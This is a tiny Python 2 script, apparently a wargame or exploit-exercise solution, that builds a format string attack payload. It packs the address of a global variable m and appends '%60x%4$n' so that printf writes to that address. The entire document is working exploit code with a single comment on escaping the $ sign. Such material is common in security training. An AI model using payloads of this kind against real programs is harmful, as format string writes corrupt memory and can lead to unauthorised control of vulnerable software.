import struct

# The address of the global variable m
target = struct.pack('I', 0x804988c)

# Note : if typed on the command line, don't forget to escape the $ sign
print target + '%60x' + '%4$n'
